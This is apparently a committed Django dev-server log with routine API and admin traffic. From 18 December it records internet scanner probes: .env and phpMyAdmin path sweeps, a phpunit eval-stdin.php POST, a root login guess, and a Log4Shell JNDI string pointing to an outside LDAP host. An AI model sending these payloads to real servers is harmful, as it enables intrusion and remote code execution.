@@ -1,0 +1,483 @@
+Traceback (most recent call last):
+  File "manage.py", line 17, in <module>
+    "Couldn't import Django. Are you sure it's installed and "
+ImportError: Couldn't import Django. Are you sure it's installed and available on your PYTHONPATH environment variable? Did you forget to activate a virtual environment?
+Not Found: /
+[17/Dec/2021 15:54:08] "GET / HTTP/1.1" 404 2224
+Not Found: /favicon.ico
+[17/Dec/2021 15:54:08] "GET /favicon.ico HTTP/1.1" 404 2257
+[17/Dec/2021 15:54:11] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 15:54:11] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3399
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1132
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 2876
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1723
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/js/jquery-1.12.4.min.js HTTP/1.1" 200 97163
+[17/Dec/2021 15:54:12] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[17/Dec/2021 15:56:37] "OPTIONS /api/ HTTP/1.1" 200 5075
+Not Found: /
+[17/Dec/2021 16:02:56] "GET / HTTP/1.0" 404 2219
+Not Found: //api
+[17/Dec/2021 16:03:01] "GET //api HTTP/1.0" 404 2231
+[17/Dec/2021 16:03:51] code 400, message Bad request version ('À\x13À')
+[17/Dec/2021 16:03:51] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[17/Dec/2021 16:03:51] "GET / HTTP/1.1" 404 2224
+[17/Dec/2021 16:03:52] code 400, message Bad request version ('À\x13À')
+[17/Dec/2021 16:03:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[17/Dec/2021 16:03:53] code 400, message Bad request version ('À\x13À')
+[17/Dec/2021 16:03:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[17/Dec/2021 16:03:53] code 400, message Bad request version ('À\x13À')
+[17/Dec/2021 16:03:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: //api
+[17/Dec/2021 16:04:05] "GET //api HTTP/1.0" 404 2231
+Not Found: /django/api
+[17/Dec/2021 16:04:28] "GET /django/api HTTP/1.0" 404 2249
+[17/Dec/2021 16:04:54] "GET /api/ HTTP/1.1" 200 4864
+Not Found: /django/api
+[17/Dec/2021 16:05:25] "GET /django/api HTTP/1.0" 404 2249
+[17/Dec/2021 16:06:07] "GET /api HTTP/1.0" 301 0
+[17/Dec/2021 16:17:12] "GET /api HTTP/1.0" 301 0
+[17/Dec/2021 16:17:12] "GET /api HTTP/1.0" 301 0
+Not Found: /
+[17/Dec/2021 16:19:51] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:21:03] "GET / HTTP/1.0" 404 2219
+[17/Dec/2021 16:21:11] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 16:21:41] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 16:24:20] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 16:24:20] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 16:24:20] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 16:24:20] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 16:24:20] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 16:24:20] "GET /api/ HTTP/1.1" 200 49
+[17/Dec/2021 16:24:20] "GET /api/ HTTP/1.1" 200 49
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3399
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1132
+[17/Dec/2021 16:24:20] "GET /api/ HTTP/1.1" 200 49
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 2876
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1723
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/jquery-1.12.4.min.js HTTP/1.1" 200 97163
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[17/Dec/2021 16:24:20] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
+[17/Dec/2021 16:24:21] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[17/Dec/2021 16:24:21] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1738
+[17/Dec/2021 16:29:56] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 16:29:56] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1738
+[17/Dec/2021 16:29:59] "GET /api/ HTTP/1.0" 200 4854
+Not Found: /
+[17/Dec/2021 16:30:04] "GET / HTTP/1.0" 404 2219
+[17/Dec/2021 16:30:08] "GET /admin HTTP/1.0" 301 0
+[17/Dec/2021 16:30:09] "GET /admin HTTP/1.0" 301 0
+[17/Dec/2021 16:30:14] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 16:30:29] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 16:30:29] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 16:30:29] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 16:30:29] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 16:30:29] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 16:30:30] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 16:30:30] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+[17/Dec/2021 16:30:30] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+[17/Dec/2021 16:30:30] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+Not Found: /admin/login
+[17/Dec/2021 16:30:30] "GET /admin/login?next=/admin/ HTTP/1.1" 404 3861
+[17/Dec/2021 16:30:30] "GET /static/admin/css/base.css HTTP/1.1" 200 15937
+[17/Dec/2021 16:30:30] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[17/Dec/2021 16:30:31] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[17/Dec/2021 16:30:31] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[17/Dec/2021 16:30:31] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+Not Found: /
+[17/Dec/2021 16:31:12] "GET / HTTP/1.0" 404 2219
+[17/Dec/2021 16:31:24] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 16:31:30] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 16:32:44] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 16:32:44] "GET /static/admin/css/base.css HTTP/1.0" 200 15937
+[17/Dec/2021 16:32:44] "GET /static/admin/css/login.css HTTP/1.0" 200 1203
+[17/Dec/2021 16:32:44] "GET /static/admin/css/fonts.css HTTP/1.0" 200 423
+[17/Dec/2021 16:32:44] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.0" 200 81348
+[17/Dec/2021 16:32:44] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.0" 200 80304
+[17/Dec/2021 16:32:52] "GET /api HTTP/1.0" 301 0
+[17/Dec/2021 16:32:52] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.0" 200 121200
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.0" 200 3399
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/css/prettify.css HTTP/1.0" 200 817
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/css/default.css HTTP/1.0" 200 1132
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/jquery-1.12.4.min.js HTTP/1.0" 200 97163
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/ajax-form.js HTTP/1.0" 200 2876
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/csrf.js HTTP/1.0" 200 1723
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.0" 200 37045
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/prettify-min.js HTTP/1.0" 200 13632
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/js/default.js HTTP/1.0" 200 1262
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/img/grid.png HTTP/1.0" 200 1458
+[17/Dec/2021 16:32:53] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.0" 404 1733
+[17/Dec/2021 16:32:59] "GET /admin HTTP/1.0" 301 0
+[17/Dec/2021 16:32:59] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 16:32:59] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 16:33:06] "GET /static/css/main.073c9b0a.css.map HTTP/1.0" 404 1688
+[17/Dec/2021 16:33:06] "GET /static/js/main.0f041a78.js.map HTTP/1.0" 404 1682
+Not Found: /
+[17/Dec/2021 16:33:15] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:33:17] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:33:20] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:33:24] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:34:03] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:35:29] "GET / HTTP/1.0" 404 2219
+Not Found: /django/api/
+[17/Dec/2021 16:35:38] "GET /django/api/ HTTP/1.0" 404 2252
+Not Found: /django/admin/
+[17/Dec/2021 16:35:53] "GET /django/admin/ HTTP/1.0" 404 2258
+Not Found: /
+[17/Dec/2021 16:36:54] "GET / HTTP/1.0" 404 2219
+Not Found: /
+[17/Dec/2021 16:37:04] "GET / HTTP/1.0" 404 2219
+Not Found: //
+[17/Dec/2021 16:37:31] "GET // HTTP/1.0" 404 2222
+Not Found: /django//api/
+[17/Dec/2021 16:51:55] "GET /django//api/ HTTP/1.0" 404 2255
+Not Found: /django/api/
+[17/Dec/2021 16:53:02] "GET /django/api/ HTTP/1.0" 404 2252
+Not Found: /django/api/api
+[17/Dec/2021 16:53:05] "GET /django/api/api HTTP/1.0" 404 2261
+Not Found: /django/api/api
+[17/Dec/2021 16:53:06] "GET /django/api/api HTTP/1.0" 404 2261
+Not Found: /api//
+[17/Dec/2021 16:55:32] "GET /api// HTTP/1.0" 404 5264
+Not Found: /api//
+[17/Dec/2021 16:55:52] "GET /api// HTTP/1.0" 404 5264
+Not Found: /api//
+[17/Dec/2021 16:56:24] "GET /api// HTTP/1.0" 404 5264
+[17/Dec/2021 16:57:43] "GET /api HTTP/1.0" 301 0
+[17/Dec/2021 16:58:14] "GET /admin/ HTTP/1.0" 302 0
+Not Found: /admin//
+[17/Dec/2021 16:59:01] "GET /admin// HTTP/1.0" 404 3836
+[17/Dec/2021 17:01:25] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:03:24] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:03:48] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:03:48] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:03:53] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:03:53] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+Not Found: /api//
+[17/Dec/2021 17:04:15] "GET /api// HTTP/1.0" 404 5264
+Not Found: /api//
+[17/Dec/2021 17:04:25] "GET /api// HTTP/1.0" 404 5264
+[17/Dec/2021 17:04:59] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:05:03] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:05:27] "OPTIONS /api/ HTTP/1.0" 200 5075
+[17/Dec/2021 17:05:31] "GET /api/?format=json HTTP/1.0" 200 61
+[17/Dec/2021 17:05:42] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 17:05:42] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1738
+[17/Dec/2021 17:05:44] "GET /api/?format=json HTTP/1.1" 200 66
+[17/Dec/2021 17:05:46] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1738
+[17/Dec/2021 17:05:49] "GET /api/?format=api HTTP/1.1" 200 4930
+[17/Dec/2021 17:05:49] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1738
+[17/Dec/2021 17:06:36] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:06:42] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:06:42] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:06:42] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:06:42] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:06:45] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:06:47] "GET /api/?format=json HTTP/1.0" 200 61
+[17/Dec/2021 17:06:51] "OPTIONS /api/ HTTP/1.0" 200 5075
+[17/Dec/2021 17:06:53] "GET /api/?format=api HTTP/1.0" 200 4920
+Not Found: /
+[17/Dec/2021 17:11:39] "GET / HTTP/1.1" 404 2224
+[17/Dec/2021 17:11:44] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 17:11:48] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 17:11:48] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 17:11:48] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+[17/Dec/2021 17:11:48] "GET /static/admin/css/base.css HTTP/1.1" 200 15937
+[17/Dec/2021 17:11:48] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[17/Dec/2021 17:11:50] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[17/Dec/2021 17:11:50] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[17/Dec/2021 17:11:50] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[17/Dec/2021 17:14:08] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 17:14:08] "GET /api/ HTTP/1.1" 200 4854
+[17/Dec/2021 17:14:13] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 17:14:14] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 17:14:14] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+[17/Dec/2021 17:14:14] "GET /static/admin/css/base.css HTTP/1.1" 200 15937
+[17/Dec/2021 17:14:14] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[17/Dec/2021 17:14:15] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[17/Dec/2021 17:14:15] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[17/Dec/2021 17:14:15] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[17/Dec/2021 17:15:26] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:15:29] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:15:34] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:15:54] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:15:57] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:15:57] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:16:01] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:16:11] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:16:22] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:17:01] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:17:05] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:17:10] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:17:10] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:17:15] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:17:57] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:18:06] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:18:12] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:19:38] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:20:01] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:20:20] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:20:20] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:20:46] "GET /api HTTP/1.1" 301 0
+[17/Dec/2021 17:20:46] "GET /api/ HTTP/1.1" 200 4864
+[17/Dec/2021 17:20:46] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3399
+[17/Dec/2021 17:20:46] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1132
+[17/Dec/2021 17:20:46] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[17/Dec/2021 17:20:46] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 2876
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1723
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/jquery-1.12.4.min.js HTTP/1.1" 200 97163
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
+[17/Dec/2021 17:20:47] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[17/Dec/2021 17:20:57] "GET /admin HTTP/1.1" 301 0
+[17/Dec/2021 17:20:57] "GET /admin/ HTTP/1.1" 302 0
+[17/Dec/2021 17:20:57] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1650
+[17/Dec/2021 17:20:57] "GET /static/admin/css/base.css HTTP/1.1" 200 15937
+[17/Dec/2021 17:20:57] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
+[17/Dec/2021 17:20:58] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[17/Dec/2021 17:20:58] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
+[17/Dec/2021 17:20:59] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
+[17/Dec/2021 17:21:03] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:21:07] "GET /api/ HTTP/1.0" 200 4854
+[17/Dec/2021 17:22:11] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:22:11] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+[17/Dec/2021 17:22:12] "GET /admin/ HTTP/1.0" 302 0
+[17/Dec/2021 17:22:12] "GET /admin/login/?next=/admin/ HTTP/1.0" 200 1650
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.60', 38534)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/home/ec2-user/django/myprojectenv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 159, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[17/Dec/2021 20:06:10] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[17/Dec/2021 20:06:11] "GET / HTTP/1.1" 404 2224
+[17/Dec/2021 21:45:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x8f\x81\x05\x1b\x04·\xad\x84S\x871fÄe3ù\x99¬uG<wË\x81º\x06Aâé8¶\x99\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[17/Dec/2021 21:45:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /admin/.env
+[18/Dec/2021 01:00:34] "GET /admin/.env HTTP/1.0" 404 3845
+Not Found: /api/.env
+[18/Dec/2021 01:00:34] "GET /api/.env HTTP/1.0" 404 23
+Not Found: /
+[18/Dec/2021 01:11:05] "GET / HTTP/1.1" 404 2224
+Not Found: /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[18/Dec/2021 03:15:08] "POST /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 3984
+Not Found: /admin/index.php
+[18/Dec/2021 03:15:26] "GET /admin/index.php HTTP/1.0" 404 3860
+Not Found: /admin/pma/index.php
+[18/Dec/2021 03:15:27] "GET /admin/pma/index.php HTTP/1.0" 404 3872
+Not Found: /admin/PMA/index.php
+[18/Dec/2021 03:15:27] "GET /admin/PMA/index.php HTTP/1.0" 404 3872
+Not Found: /admin/mysql/index.php
+[18/Dec/2021 03:15:27] "GET /admin/mysql/index.php HTTP/1.0" 404 3878
+Not Found: /admin/mysql2/index.php
+[18/Dec/2021 03:15:28] "GET /admin/mysql2/index.php HTTP/1.0" 404 3881
+Not Found: /admin/phpmyadmin/index.php
+[18/Dec/2021 03:15:28] "GET /admin/phpmyadmin/index.php HTTP/1.0" 404 3893
+Not Found: /admin/phpMyAdmin/index.php
+[18/Dec/2021 03:15:28] "GET /admin/phpMyAdmin/index.php HTTP/1.0" 404 3893
+Not Found: /admin/phpmyadmin2/index.php
+[18/Dec/2021 03:15:28] "GET /admin/phpmyadmin2/index.php HTTP/1.0" 404 3896
+[18/Dec/2021 03:46:14] code 400, message Bad request syntax ('\x01\x01æ')
+[18/Dec/2021 03:46:14] "æ" 400 -
+[18/Dec/2021 03:48:17] code 400, message Bad request syntax ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03§l\x9aÞæ[\x80?\x94É\x89X\x8bn\x10Z´`/EÖ')
+[18/Dec/2021 03:48:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[18/Dec/2021 05:18:37] "GET / HTTP/1.1" 404 2224
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.194', 42286)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/home/ec2-user/django/myprojectenv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 159, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[18/Dec/2021 13:02:06] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[18/Dec/2021 13:02:06] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[18/Dec/2021 15:14:45] "GET / HTTP/1.1" 404 2224
+Not Found: /${jndi:ldap://31.131.16.127:1389/Exploit}
+[18/Dec/2021 18:02:55] "GET /${jndi:ldap://31.131.16.127:1389/Exploit} HTTP/1.1" 404 2346
+Not Found: /
+[18/Dec/2021 18:02:55] "GET / HTTP/1.1" 404 2219
+Not Found: /login
+[18/Dec/2021 18:02:55] "POST /login HTTP/1.1" 404 2235
+Not Found: /
+[18/Dec/2021 18:02:55] "GET / HTTP/1.1" 404 2219
+Invalid HTTP_HOST header: '110.242.68.4'. You may need to add '110.242.68.4' to ALLOWED_HOSTS.
+Not Found: /
+[18/Dec/2021 18:21:39] "GET / HTTP/1.1" 404 2224
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.57', 43668)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/home/ec2-user/django/myprojectenv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 159, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[18/Dec/2021 18:46:50] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[18/Dec/2021 18:46:51] "GET / HTTP/1.1" 404 2224
+Not Found: /admin/phpMyAdmin/index.php
+[18/Dec/2021 18:48:17] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 3901
+Not Found: /admin/phpMyAdmin/index.php
+[18/Dec/2021 18:48:17] "GET /admin/phpMyAdmin/index.php?lang=en&pma_username=root&pma_password=2013 HTTP/1.0" 404 3945
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.42', 40978)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/home/ec2-user/django/myprojectenv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 159, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[18/Dec/2021 23:47:24] "GET / HTTP/1.1" 404 2224
+Not Found: /
+[18/Dec/2021 23:47:24] "GET / HTTP/1.1" 404 2224
+Invalid HTTP_HOST header: 'ip-172-31-35-243.ap-south-1.compute.internal:8000'. You may need to add 'ip-172-31-35-243.ap-south-1.compute.internal' to ALLOWED_HOSTS.
+[19/Dec/2021 03:32:22] "GET / HTTP/1.0" 400 61496
+Invalid HTTP_HOST header: 'ip-172-31-35-243.ap-south-1.compute.internal:8000'. You may need to add 'ip-172-31-35-243.ap-south-1.compute.internal' to ALLOWED_HOSTS.
+[19/Dec/2021 03:32:29] "GET / HTTP/1.0" 400 61496
+Not Found: /text4041639884748
+[19/Dec/2021 03:32:29] "GET /text4041639884748 HTTP/1.1" 404 2275
+Not Found: /sdk
+[19/Dec/2021 03:32:30] "POST /sdk HTTP/1.1" 404 2234
+Not Found: /
+[19/Dec/2021 03:32:30] "GET / HTTP/1.1" 404 2219
+Not Found: /evox/about
+[19/Dec/2021 03:32:30] "GET /evox/about HTTP/1.1" 404 2254
+Not Found: /HNAP1
+[19/Dec/2021 03:32:30] "GET /HNAP1 HTTP/1.1" 404 2239
+[19/Dec/2021 03:32:40] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x033\x95\x183Rú\x12{,\x1a\x91T·0Ì%°¦')
+[19/Dec/2021 03:32:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[19/Dec/2021 03:32:40] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x8d7M5.\x11@O(EÉ\x13\x19#\x80\x94%Ü)x\x00½¶i0\x9b\x9eÀðôB¢\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00')
+[19/Dec/2021 03:32:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[19/Dec/2021 03:32:46] "GET / HTTP/1.1" 404 2224
+Not Found: /favicon.ico
+[19/Dec/2021 03:32:47] "GET /favicon.ico HTTP/1.1" 404 2257
